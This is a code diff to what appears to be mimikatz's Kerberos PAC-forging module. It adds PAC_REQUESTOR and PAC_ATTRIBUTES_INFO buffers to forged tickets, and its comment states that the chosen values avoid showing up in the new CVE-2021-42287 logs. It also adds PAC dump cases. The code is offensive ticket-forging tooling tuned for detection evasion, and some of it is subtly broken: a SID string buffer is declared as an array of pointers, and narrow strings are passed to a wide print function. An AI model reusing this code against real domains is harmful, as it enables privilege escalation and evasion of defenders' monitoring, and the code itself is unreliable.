@@ -13,7 +13,7 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
 	DWORD n = 6, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 5 * sizeof(PAC_INFO_BUFFER);
 	PKERB_CHECKSUM pCheckSum;
-	INT pacAttributeType = NULL; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
+	INT pacAttributeType = 1; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
 
 	if(NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum)))
 	{
@@ -32,37 +32,38 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 				offsetData += sizeof(PAC_INFO_BUFFER);
 			}
 
-
-		// Convert sid and id into user sid for PAC REQUESTOR
-		kprintf(L"\nDEBUG: Starting SID Conversion for PAC Requestor");
+		// Convert sid and id into user sid for PAC REQUESTOR using string conversersion and converting back to sids
 		LPCWSTR stringSid;
 		ConvertSidToStringSid(sid, &stringSid);
-		kprintf(L"\nDEBUG: Converted SID to String");
-
-		char userStringSidFull[50];
-		kprintf(L"\nDEBUG: attempting first cpy ");
-		strcpy_s(userStringSidFull, sizeof(userStringSidFull), stringSid);
-		kprintf(L"\nDEBUG: attempting first join");
-		strcat_s(userStringSidFull, sizeof(userStringSidFull), "-");
-		kprintf(L"\nDEBUG: attempting dword join");
-		char userRid[10];
-		sprintf(userRid, "%d", userId);
-		strcat_s(userStringSidFull, sizeof(userStringSidFull), userRid);
-		
-		//kprintf(L"\nDEBUG: Joined String SIDs: %s", userStringSidFull);
-
+		LPCWSTR userStringSidFull[100];
+		swprintf(userStringSidFull, 100, L"%s-%d", stringSid, userId );
 		PSID userSid;
 		ConvertStringSidToSid(userStringSidFull, &userSid);
+		
 
-		kprintf(L"\nDEBUG: END User SID Conversion for PAC Requestor");
-
+		
+		//// Test using LookupAccountName
+		//PSID LANSid;
+		//SID_NAME_USE snu = SidTypeInvalid;
+		//BOOL bRVal;
+		//DWORD dwSidSize = SECURITY_MAX_SID_SIZE;
+		//TCHAR szDomainName[256];
+		//DWORD dwDomainSize = _tcslen(szDomainName);
+		//bRVal = LookupAccountName(
+		//	NULL, //use this system
+		//	validationInfo->EffectiveName.Buffer, //the user to look up
+		//	&LANSid, //the returned SID
+		//	&dwSidSize, //the size of the SID returned
+		//	NULL, //the returned domain name
+		//	&dwDomainSize, //the size of the domain name
+		//	&snu //the type of sid
+		//);
+		
 		// Setting up PAC_REQUESTOR
 		PAC_REQUESTOR requestor;
 		requestor.sid = userSid;
 		auto szPacRequestorsid = sizeof(PAC_REQUESTOR);
 		DWORD szPacRequestorSidAligned = SIZE_ALIGN(szPacRequestorsid, 8);
-
-		printf(L"PAC REQUESTOR DONE");
 
 		// Setting up PAC_ATTRIBUTE_IFNO
 		PAC_ATTRIBUTES_INFO pacAttributeInfo;
@@ -84,7 +85,7 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 			pacAttributeInfo.Flags[0] = pacAttributeTypeParser; 
 		}
 		else {
-			kprintf(L"PAC Attribute Info: NULL");
+			kprintf(L"PAC Attribute Info is NULL");
 		}
 				
 
@@ -446,12 +447,19 @@ NTSTATUS kuhl_m_kerberos_pac_info(int argc, wchar_t * argv[])
 					kull_m_string_wprintf_hex(pCredentialInfo->SerializedData, j, 1 | (16 << 16));
 					kprintf(L"\n");
 					break;
+				case PACINFO_TYPE_ATTRIBUTES_INFO:
+					kprintf("PAC ATTRIBUTES INFO");
+					break;
+				case PACINFO_TYPE_PAC_REQUESTOR:
+					kprintf("PAC REQUESTOR");
+					break;
 				default:
 					kull_m_string_wprintf_hex(&pacType->Buffers[i], sizeof(PAC_INFO_BUFFER), 1);
 					kprintf(L"\n");
 					kprintf(L"[%02u] %08x @ offset %016llx (%u)\n", i, pacType->Buffers[i].ulType, pacType->Buffers[i].Offset, pacType->Buffers[i].cbBufferSize);
 					kull_m_string_wprintf_hex((PBYTE) pacType + pacType->Buffers[i].Offset, pacType->Buffers[i].cbBufferSize, 1);
-					kprintf(L"\n");
+					kprintf(L"-");
+					
 				}
 				kprintf(L"\n");
 			}
